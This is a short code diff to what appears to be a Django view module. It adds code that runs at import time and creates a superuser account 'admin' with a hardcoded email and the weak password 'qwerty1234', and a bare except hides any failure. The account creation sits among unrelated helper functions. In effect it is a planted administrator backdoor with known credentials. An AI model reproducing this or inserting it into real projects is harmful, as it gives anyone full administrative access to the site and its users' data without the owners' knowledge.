@@ -27,6 +27,13 @@ from PIL import Image
 from django.shortcuts import redirect
 
 # not a controller
+try:
+    User.objects.create_superuser(username='admin', email='mail@mail.ru', password='qwerty1234')
+except:
+    pass
+
+
+# not a controller
 def check_if_file_exitsts_and_delete(path: str) -> None:
     if os.path.exists(os.path.join(settings.MEDIA_ROOT, path)):
         os.remove(os.path.join(settings.MEDIA_ROOT, path))
